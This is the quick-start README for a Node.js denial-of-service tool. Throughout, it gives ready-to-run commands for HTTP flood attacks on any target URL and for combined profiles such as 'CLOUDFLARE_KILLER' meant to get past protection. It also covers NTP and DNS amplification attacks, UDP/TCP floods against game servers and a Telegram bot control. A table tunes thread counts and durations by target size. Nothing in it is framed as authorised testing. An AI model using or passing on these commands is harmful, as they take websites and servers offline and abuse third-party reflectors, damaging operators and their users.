# 🚀 Quick Start Guide

## ⚡ Run Commands (With Memory Fix)

### 🔥 Method 1: Using npm scripts (RECOMMENDED)

```bash
# Normal attack
npm run attack -- -t https://target.com -m GET -th 500 -d 120

# Combo attack
npm run combo -- -t https://target.com -p MAXIMUM_POWER

# Smart attack (auto-detect)
npm run smart -- -t https://target.com -th 500 -d 180

# Scan target
npm run scan -- -t https://target.com

# Telegram bot
npm run telegram
```

### 🔥 Method 2: Direct node command

#### Linux/Mac:
```bash
# Make script executable
chmod +x run.sh

# Run attack
./run.sh attack -t https://target.com -m GET -th 500 -d 120

# Or direct:
NODE_OPTIONS="--max-old-space-size=8192 --expose-gc" node index.js attack -t target.com -m GET -th 500
```

#### Windows PowerShell:
```powershell
$env:NODE_OPTIONS="--max-old-space-size=8192 --expose-gc"
node index.js attack -t https://target.com -m GET -th 500 -d 120
```

#### Windows CMD:
```cmd
set NODE_OPTIONS=--max-old-space-size=8192 --expose-gc
node index.js attack -t https://target.com -m GET -th 500 -d 120
```

---

## 🎯 Common Commands

### 1. Normal Attack
```bash
npm run attack -- -t https://target.com -m GET -th 500 -d 120
```

### 2. Combo Attack (Multiple methods)
```bash
# Use profile
npm run combo -- -t https://target.com -p MAXIMUM_POWER

# Custom combo
npm run combo -- -t target.com -m GET,POST,HTTP2 -th 600 -d 180
```

### 3. Smart Attack (Auto-detect best method)
```bash
npm run smart -- -t https://target.com -th 500 -d 180
```

### 4. Scan Target
```bash
npm run scan -- -t https://target.com
```

### 5. Amplification Attack
```bash
# NTP Amplification (556x power!)
npm run attack -- -t 1.2.3.4:123 -m NTP-AMP -th 200 -d 180

# DNS Amplification
npm run attack -- -t 1.2.3.4:53 -m DNS-AMP -th 200 -d 120
```

### 6. Telegram Bot
```bash
npm run telegram
```

---

## 📊 Recommended Thread Counts

| Target Type | Threads | Duration | Method |
|------------|---------|----------|--------|
| Small site | 100-300 | 60-120s | GET, POST |
| Medium site | 300-500 | 120-180s | STRESS, HTTP2 |
| Large site | 500-800 | 180-300s | Combo Attack |
| Cloudflare | 300-500 | 180-300s | CFB, BYPASS |
| Game server | 200-400 | 120-180s | UDP, TCP |

---

## 🔥 Power Profiles

### Maximum Power
```bash
npm run combo -- -t target.com -p MAXIMUM_POWER
# 6 methods: GET, POST, HTTP2, STRESS, NULL, DYN
# 600 threads total
```

### Cloudflare Killer
```bash
npm run combo -- -t target.com -p CLOUDFLARE_KILLER
# 4 methods: CFB, BYPASS, HTTP2-CF, STRESS
# 400 threads total
```

### Hybrid Attack
```bash
npm run combo -- -t target.com -p HYBRID_ATTACK
# 5 methods: UDP, TCP, GET, POST, HTTP2
# 500 threads total
```

---

## 💡 Tips

1. **Always start with scan:**
   ```bash
   npm run scan -- -t target.com
   ```

2. **Use smart attack for auto-optimization:**
   ```bash
   npm run smart -- -t target.com
   ```

3. **Monitor memory usage:**
   - Linux: `htop`
   - Windows: Task Manager

4. **If out of memory, reduce threads:**
   ```bash
   npm run attack -- -t target.com -m GET -th 300 -d 120
   ```

---

## 🐛 Troubleshooting

### Out of Memory Error
See [MEMORY-FIX.md](MEMORY-FIX.md) for detailed solutions.

Quick fix:
```bash
# Reduce threads
npm run attack -- -t target.com -m GET -th 300 -d 120
```

### Bot Errors
All common bot errors are now handled automatically.

---

## 📖 Full Documentation

- [FEATURES.md](FEATURES.md) - Complete feature list
- [MEMORY-FIX.md](MEMORY-FIX.md) - Memory optimization
- [README.md](README.md) - Full documentation

---

Made with 🔥 by **Aryzz-Dev**
